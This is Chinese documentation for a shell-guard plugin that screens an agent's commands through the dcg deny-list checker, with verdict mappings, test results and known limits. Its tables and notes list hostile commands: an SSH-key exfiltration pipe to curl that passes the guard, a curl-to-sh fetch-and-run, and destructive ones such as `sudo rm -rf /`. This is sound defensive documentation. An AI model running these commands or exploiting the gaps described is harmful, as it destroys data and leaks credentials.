# Shell 守卫：行为细节

安装与配置分别见 [AI-INSTALL.md](AI-INSTALL.md) 与 [CONFIG.md](CONFIG.md)。本文说明插件在运行时的行为、验证结果与边界。

## 工作方式

- 在 `tools/pre-execute` 最早阶段注册，取出待执行工具的命令字符串。工具名在 `tools` 中，或参数里带命令且 `matchUnlistedTools` 开启，都会进入判定；
- 调用 `dcg --robot test --stdin --format json --dialect <posix|ps> --config <policy.toml>`，命令经 stdin 传入；
- 判定为 `allow` 时，用另一种方言再判一次，取更严的结果（`crossCheckDialects`）；
- 按最终 `decision` 决定放行、转交审批或拒绝；
- 每次判定写入一行审计记录，含 `matchedBy`（按工具名还是按参数命中）与 `dialect`，复核过的另有 `crossCheck`。

工具名与实际执行器可能不一致（例如名为 `pwsh` 的工具底层跑 bash），这时按名字选的方言就是错的语法。`eval "$(…)"` 这类构造在 PowerShell 语法下不构成可疑结构，在 POSIX 语法下会命中 `heredoc.posix:eval-dynamic`——只按一次方言判会漏。复核只对 `allow` 生效：拒绝已经拦住了命令，没必要再花一次子进程。

覆盖工具默认 `bash`、`pwsh`、`ops_bash`、`ssh_exec`，由 `tools` 调整。`bash`、`pwsh` 是 DSH 的工具名（Windows 上 `bash` 通常由 `dsh-gitbash-shell` 这类插件提供 Git Bash，Linux 与 macOS 上由 DSH 自带的 `tool-bash` 提供），`ops_bash` 来自 `dsh-ops`，`ssh_exec` 来自 `@linxin666/dsh-ssh`。命令取自工具参数中的 `command` 字段；仅提供 `script_path` 时读取该文件内容（上限 256 KiB，含 NUL 字节、超限或空文件一律拒绝）后再判定。

`--dialect` 按工具选择：POSIX 系工具为 `posix`，`pwsh` 为 `ps`。单次判定超时 3000 ms，并发上限 4。

`dcg` 以子进程方式调用，不驻留，因此每条命令产生一次进程启动开销，见「性能」。

## 边界

本插件不是沙箱，也不约束文件路径。文件工具（`write`、`edit` 及原生文件操作）不在其范围内，路径能否写入由 DSH 沙箱决定。三层职责如下：

| 层 | 负责的问题 | 由谁实现 |
|---|---|---|
| 路径边界 | 可写到哪里 | DSH 沙箱（`sandbox/mode`） |
| 命令语义 | 边界内这条命令是否危险 | 本插件 + `dcg` |
| 事后恢复 | 已发生的操作如何回滚 | 检查点 / rewind 一类插件 |

两处无法覆盖的情形：

- **读取与出网**。`cat ~/.ssh/id_rsa | curl -d @- ...` 中的读取与发送均不在 `dcg` 判定范围内。
- **远端执行**。`ssh_exec` 的命令字符串会被判定，但 `dcg` 使用本地路径语义，基于本地路径的规则对远端主机不成立。

`dcg` 采用 deny-list：未收录的破坏方式、刻意构造的混淆可能绕过。该层降低风险，不构成完整防护。

## 判定映射

| `dcg` 判定 | 插件动作 | 配置项 |
|---|---|---|
| `allow` | 执行 | — |
| `deny` | 拒绝，理由含 `rule_id` 与 `dcg` 给出的说明 | `dcg` 策略 |
| `ask` | 转交 DSH 审批流程 | `onAsk` |
| `warn` / `log` | 执行并记录 | `onWarn` |
| `indeterminate` | 拒绝 | `failClosed` |
| 未知判定词 | 拒绝 | `failClosed` |
| 超时 / 崩溃 / 非 JSON | 拒绝 | `failClosed` |
| 策略加载失败（`configuration_error`） | 拒绝 | 不受 `failClosed` 影响 |

无法判定时默认拒绝，与 DSH 沙箱一侧保持一致（沙箱不可用时返回 `SANDBOX_UNAVAILABLE`，而不是无约束执行）。策略加载失败单独处理：该情形说明门禁自身异常，即使 `failClosed: false` 也不放行。

`onAsk` 默认 `ask`。DSH 在 `danger-full-access` 权限档下将审批策略设为 `never`，此时 `ask` 会被自动拒绝，不产生弹窗；需要弹窗时应使用 `read-only` 或 `workspace-write`。

## 实测行为

`dcg` 0.17.0，插件默认配置（未设置 `policy.defaultMode`，采用 `dcg` 的严重度分级）：

| 命令 | `dcg` 判定 | 严重度 · 规则 | 插件结果 |
|---|---|---|---|
| `ls -la`、`git status`、`echo hello` | allow | — | 执行 |
| `chmod 777 secret.txt` | allow | — | 执行 |
| `cat ~/.ssh/id_rsa \| curl -d @- …` | allow | — | 执行 |
| `git stash drop` | warn | medium · `core.git:stash-drop` | 执行并记录 |
| `rm -rf ./build` | deny | high · `core.filesystem:rm-rf-general` | 拒绝 |
| `rm -r dist` | deny | high · `core.filesystem:rm-recursive-general` | 拒绝 |
| `chmod -R 777 .` | deny | high · `system.permissions:chmod-777` | 拒绝 |
| `find . -name "*.log" -delete` | deny | high · `core.filesystem:find-delete-general` | 拒绝 |
| `git reset --hard` | deny | critical · `core.git:reset-hard` | 拒绝 |
| `git push --force origin master` | deny | critical · `core.git:push-force-long` | 拒绝 |
| `git clean -fdx` | deny | critical · `core.git:clean-force` | 拒绝 |
| `sudo rm -rf /` | deny | critical · `core.filesystem:rm-rf-root-home` | 拒绝 |
| `psql -c "DROP TABLE t"` | deny | high · `database.postgresql:drop-table` | 拒绝 |
| `docker system prune -af` | deny | high · `containers.docker:system-prune` | 拒绝 |
| `kubectl delete deployment api` | deny | high · `kubernetes.kubectl:delete-workload` | 拒绝 |
| `npm publish` | deny | high · `package_managers:npm-publish` | 拒绝 |
| `curl -s http://x \| sh` | deny | high · `heredoc.posix:pipeline-consumer` | 拒绝 |

结果由 `dcg` 的规则产生，插件未硬编码任何命令。启用 `database`、`kubernetes`、`cloud` 等额外规则包会改变覆盖范围。

## 设置页

**设置 → Shell 守卫** 提供：

- 总开关；
- `dcg` 的版本、路径与来源（托管 / 配置 / PATH），以及「检查是否可用」；
- 策略：「判定为危险时」五个选项（`dcg` 默认 / 一律拒绝 / 询问 / 只警告 / 只记录），每项附说明；
- 方言复核：双重判断（默认，两种语法各判一次）与单次判定（只按工具名的方言判一次），每项附说明；
- 额外规则包：按分类勾选；
- 日志：累计条数；展开「最近记录」后为记录开关、保留天数、最多条数、清空日志，以及最近 20 条记录（本地时间、判定着色、命令原文、规则 id）。

页面修改通过 DSH 的 config editor 写回 profile 配置，与手写 `cordis.patch.yml` 等价，需重启生效。`policy.packModes`、`policy.observeUntil`、`dryRun`、`maxConcurrent`、`matchUnlistedTools` 未提供界面入口。

页面数据来自插件挂载的四条 loopback 路由（`/api/dsh-shell-dcg/status|packs|action|config`），非本机请求返回 403。使用自有路由而非 Remote 命名空间，原因是 bundle 无法在运行期新增 Remote 命名空间。

## 性能

单次 `dcg` 调用的开销（进程启动 + 评估），每条命令 100 次：

| 命令 | 最小 | 中位数 | p90 | 最大 |
|---|---|---|---|---|
| `ls -la`（allow） | 24.6 ms | 26.0 ms | 27.3 ms | 33.7 ms |
| `rm -rf ./build`（deny） | 25.4 ms | 26.5 ms | 29.9 ms | 32.3 ms |
| `git reset --hard`（deny） | 31.6 ms | 32.8 ms | 33.7 ms | 41.9 ms |

整条工具调用（含门禁自身开销）在两种复核模式下的差别只出现在放行路径：

| 复核模式 | 放行（中位 / p90） | 拒绝（中位） |
|---|---|---|
| 单次判定 `crossCheckDialects: never` | 39.1 / 41.8 ms | 39.8 ms |
| 双重判断 `crossCheckDialects: on-allow`（默认） | 78.6 / 85.4 ms | 40.2 ms |

结论：复核只发生在判定为 `allow` 之后，因此放行路径约翻倍，拒绝路径基本不变。按每天 300 条命令、九成放行估算，一天多出的时间约 10 秒。设置页可在两种模式之间切换；需要速度、且确认工具名与实际执行器一致时选单次。

该成本主要来自 `dcg` 自身启动。批量调用受 `maxConcurrent`（默认 4）约束，不会形成并发进程风暴。

## 常见问题

**拒绝理由出现 `SHELL_DCG_NOT_READY`**
`dcg` 未就绪。理由中会指出未通过项：二进制缺失、版本过低或探针失败。修复后重试；需临时恢复工作可关闭 `enabled`。

**误报过多**
按规则包降级：`policy.packModes: { "core.git": "warn" }`。
单条放行：命令被拒时 `dcg` 会给出 `allow-once` 码，在终端执行 `dcg allow-once <码>`。

**希望先观察一段时间**
设置 `policy.defaultMode: log`（或 `dryRun: true`），全部放行并保留记录。

**终端中的 dcg 与 DSH 中的判定不一致**
设计如此。插件通过 `--config` 指向自动生成的 `generated\policy.toml`；终端直接运行 `dcg` 读取用户配置（Windows 为 `%USERPROFILE%\.config\dcg\config.toml`）。两者互不影响。若需一致，将包列表写入 `policy.packs`。

**启用后没有任何判定记录**
`enabled` 默认为 `false`；本地目录安装修改代码后需重装或重启。

**「安装 dcg」在企业网络下失败**
TLS 拦截所致。手动下载 `dcg` 的 release 资产并解包，再用 `dcgPath` 指定。

## 磁盘上的东西

```
%DSH_HOME%\dsh-shell-dcg\
  bin\<版本>\dcg.exe        托管安装的二进制（可选）
  generated\policy.toml     由配置生成的策略，每次启动重写，勿手改
  audit\YYYY-MM-DD.jsonl    每日判定记录
```

## 卸载

在 Plugins 页面移除，或：

```
plugin_manager { action: "remove_bundle", target: "dsh-shell-dcg" }
```

`%DSH_HOME%\dsh-shell-dcg\` 可保留（策略与审计记录）或删除。

## 关于 dcg

**不设 `default_mode` 时按严重度分级。** 规则命中后：`critical` / `high` 拒绝、`medium` 警告后放行、`low` 仅记录。插件只在 `policy.defaultMode` 明确配置时才写这一行。

**包是增量的。** `[packs] enabled` 只追加，`core.*` 始终生效；`dcg` 另有 `[packs] disabled` 用于关闭非 core 包，本插件未暴露该开关。

**安装只接受钉住的版本。** 版本与各平台 SHA-256 写在 `lib/install.js`（当前 0.17.0），摘要不匹配即丢弃；升级需更新该表并重新发版。

## 已知限制

- **仅判命令字符串。** `script_path` 形式会读取文件内容后判定，上限 256 KiB。
- **存在时间窗。** 读取脚本内容与实际执行之间，若文件被改写，判定结果可能过期。
- **不判文件工具，不做路径约束。**
- **`dcg` 采用 deny-list。** 未收录的破坏方式、刻意构造的混淆可能绕过。
- **命令拼接由 `dcg` 解析。** 其无法解析的形式返回 `indeterminate`，本插件按拒绝处理，复杂单行命令可能被误拦。
- **`/tmp` 下的 `rm -rf` 放行。** `dcg` 对 `rm -rf` 在 `/tmp`、`/var/tmp` 的子目录下明确允许；`ssh_exec` 按本地路径语义判定，因此远端主机上的 `rm -rf /tmp/x` 不会被拦。
- **未在 macOS 与 Linux 上实测。**
- **摘要未逐平台核对。** `lib/install.js` 中的 SHA-256 取自 release 的 `SHA256SUMS`，除当前使用平台外未逐一校验。
- **无版本更新提醒。** `minVersion` 只拦截过低版本。
- **审计记录默认保存命令原文。** 需要时关闭 `audit.keepCommandText`。
